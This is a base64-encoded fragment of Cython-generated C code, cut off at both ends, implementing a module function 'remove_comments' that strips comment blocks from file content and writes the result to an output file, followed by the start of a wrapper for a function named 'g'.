9fcHl4X3R1cGxlWzFdLCBOVUxMKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgZ290byBfX3B5eF9MNjtcbiAgICAgIH1cbiAgICAgIF9fcHl4X0w2OjtcbiAgICB9XG4gICAgZ290byBfX3B5eF9MMTY7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDE2OjtcbiAgfVxuXG4gIFxuICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8pO1xuICBfX3B5eF92X291dHB1dF9jb250ZW50ID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV87XG5cbiAgXG4gIF9fcHl4X3ZfaW5fY29tbWVudCA9IDA7XG5cbiAgXG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCk7XG4gIF9fcHl4X3ZfaSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wO1xuXG4gIFxuICB3aGlsZSAoMSkge1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdl9jb250ZW50KSkgeyBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKCJjb250ZW50Iik7IF9fUFlYX0VSUigwLCAzMCwgX19weXhfTDFfZXJyb3IpIH1cbiAgICBfX3B5eF90XzEzID0gUHlPYmplY3RfTGVuZ3RoKF9fcHl4X3ZfY29udGVudCk7IGlmICh1bmxpa2VseShfX3B5eF90XzEzID09ICgoUHlfc3NpemVfdCktMSkpKSBfX1BZWF9FUlIoMCwgMzAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fcHl4X3RfMyA9IFB5TG9uZ19Gcm9tU3NpemVfdChfX3B5eF90XzEzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIF9fcHl4X3RfMSA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfaSwgX19weXhfdF8zLCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEyIDwgMCkpKSBfX1BZWF9FUlIoMCwgMzAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIGlmICghX19weXhfdF8xMikgYnJlYWs7XG5cbiAgICBcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3ZfY29udGVudCkpIHsgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcigiY29udGVudCIpOyBfX1BZWF9FUlIoMCwgMzEsIF9fcHl4X0wxX2Vycm9yKSB9XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdl9pLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMiwgMiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDMxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9HZXRTbGljZShfX3B5eF92X2NvbnRlbnQsIDAsIDAsICZfX3B5eF92X2ksICZfX3B5eF90XzEsIE5VTEwsIDAsIDAsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19weXhfdF8xMiA9IChfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMiwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEyIDwgMCkpKSBfX1BZWF9FUlIoMCwgMzEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIGlmIChfX3B5eF90XzEyKSB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdl9pbl9jb21tZW50ID0gMTtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF92X2ksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF80LCA0LCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzMsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3ZfaSwgX19weXhfdF8zKTtcbiAgICAgIF9fcHl4X3RfMyA9IDA7XG5cbiAgICAgIFxuICAgICAgZ290byBfX3B5eF9MMTdfY29udGludWU7XG5cbiAgICAgIFxuICAgIH1cblxuICAgIFxuICAgIGlmICh1bmxpa2VseSghX19weXhfdl9jb250ZW50KSkgeyBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKCJjb250ZW50Iik7IF9fUFlYX0VSUigwLCAzNSwgX19weXhfTDFfZXJyb3IpIH1cbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF92X2ksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yLCAyLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKF9fcHl4X3ZfY29udGVudCwgMCwgMCwgJl9fcHl4X3ZfaSwgJl9fcHl4X3RfMywgTlVMTCwgMCwgMCwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM1LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX3B5eF90XzEyID0gKF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18zLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTIgPCAwKSkpIF9fUFlYX0VSUigwLCAzNSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgaWYgKF9fcHl4X3RfMTIpIHtcblxuICAgICAgXG4gICAgICBfX3B5eF92X2luX2NvbW1lbnQgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5TG9uZ19BZGRPYmpDKF9fcHl4X3ZfaSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIsIDIsIDEsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNywgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9pLCBfX3B5eF90XzEpO1xuICAgICAgX19weXhfdF8xID0gMDtcblxuICAgICAgXG4gICAgICBnb3RvIF9fcHl4X0wxN19jb250aW51ZTtcblxuICAgICAgXG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfdF8xMiA9ICghX19weXhfdl9pbl9jb21tZW50KTtcbiAgICBpZiAoX19weXhfdF8xMikge1xuXG4gICAgICBcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdl9jb250ZW50KSkgeyBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKCJjb250ZW50Iik7IF9fUFlYX0VSUigwLCA0MCwgX19weXhfTDFfZXJyb3IpIH1cbiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEl0ZW0oX19weXhfdl9jb250ZW50LCBfX3B5eF92X2kpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MCwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fcHl4X3RfMyA9IFB5TnVtYmVyX0luUGxhY2VBZGQoX19weXhfdl9vdXRwdXRfY29udGVudCwgX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDAsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9vdXRwdXRfY29udGVudCwgX19weXhfdF8zKTtcbiAgICAgIF9fcHl4X3RfMyA9IDA7XG5cbiAgICAgIFxuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5TG9uZ19BZGRPYmpDKF9fcHl4X3ZfaSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEsIDEsIDEsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0MSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X2ksIF9fcHl4X3RfMyk7XG4gICAgX19weXhfdF8zID0gMDtcbiAgICBfX3B5eF9MMTdfY29udGludWU6O1xuICB9XG5cbiAgXG4gICB7XG4gICAgX19weXhfdF8xID0gTlVMTDtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9vcGVuKTtcbiAgICBfX3B5eF90XzYgPSBfX3B5eF9idWlsdGluX29wZW47IFxuICAgIF9fcHl4X3RfNCA9IDE7XG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMSwgX19weXhfdl9vdXRwdXRfZmlsZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3d9O1xuICAgICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF82LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgzLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0MiwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICB9XG4gICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0XzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19weXhfdF8xID0gTlVMTDtcbiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDIsIF9fcHl4X0wyMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX3B5eF90XzQgPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMikpKSB7XG4gICAgICBfX3B5eF90XzEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzIpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfMSk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzIsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzQgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBOVUxMfTtcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDIsIF9fcHl4X0wyMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgIH1cbiAgICBfX3B5eF90XzIgPSBfX3B5eF90XzY7XG4gICAgX19weXhfdF82ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAge1xuICAgICAge1xuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF85LCAmX19weXhfdF84LCAmX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgIHtcbiAgICAgICAgICBfX3B5eF92X291dHB1dF9mID0gX19weXhfdF8yO1xuICAgICAgICAgIF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzMgPSBfX3B5eF92X291dHB1dF9mO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzMpO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMywgX19weXhfdl9vdXRwdXRfY29udGVudH07XG4gICAgICAgICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd3JpdGUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDMsIF9fcHl4X0wyNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDMwX3RyeV9lbmQ7XG4gICAgICAgIF9fcHl4X0wyNV9lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm5xLnJlbW92ZV9jb21tZW50cyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMiwgJl9fcHl4X3RfMywgJl9fcHl4X3RfNikgPCAwKSBfX1BZWF9FUlIoMCwgNDIsIF9fcHl4X0wyN19leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19weXhfdF8xID0gUHlUdXBsZV9QYWNrKDMsIF9fcHl4X3RfMiwgX19weXhfdF8zLCBfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MiwgX19weXhfTDI3X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzUsIF9fcHl4X3RfMSwgTlVMTCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDQyLCBfX3B5eF9MMjdfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgaWYgKF9fcHl4X3RfMTIgPCAoMCkpIF9fUFlYX0VSUigwLCA0MiwgX19weXhfTDI3X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX3B5eF90XzExID0gKCFfX3B5eF90XzEyKTtcbiAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF8xMSkpIHtcbiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8yKTtcbiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8zKTtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfMiwgX19weXhfdF8zLCBfX3B5eF90XzYpO1xuICAgICAgICAgICAgX19weXhfdF8yID0gMDsgIF9fcHl4X3RfMyA9IDA7ICBfX3B5eF90XzYgPSAwOyBcbiAgICAgICAgICAgIF9fUFlYX0VSUigwLCA0MiwgX19weXhfTDI3X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgZ290byBfX3B5eF9MMjZfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfTDI3X2V4Y2VwdF9lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOSwgX19weXhfdF84LCBfX3B5eF90XzcpO1xuICAgICAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgICAgICBfX3B5eF9MMjZfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzksIF9fcHl4X3RfOCwgX19weXhfdF83KTtcbiAgICAgICAgX19weXhfTDMwX3RyeV9lbmQ6O1xuICAgICAgfVxuICAgIH1cbiAgICAge1xuICAgICAge1xuICAgICAgICBpZiAoX19weXhfdF81KSB7XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdLCBOVUxMKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MiwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgZ290byBfX3B5eF9MMjQ7XG4gICAgICB9XG4gICAgICBfX3B5eF9MMjQ6O1xuICAgIH1cbiAgICBnb3RvIF9fcHl4X0wzNDtcbiAgICBfX3B5eF9MMjFfZXJyb3I6O1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDM0OjtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJucS5yZW1vdmVfY29tbWVudHMiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2lucHV0X2YpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfY29udGVudCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9vdXRwdXRfY29udGVudCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9pKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X291dHB1dF9mKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ybnFfN2coUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm5xXzdnID0geyJnIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ybnFfN2csIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJucV83ZyhQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X25hbWUgPSAwO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJncztcbiAgI2VuZGlmXG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4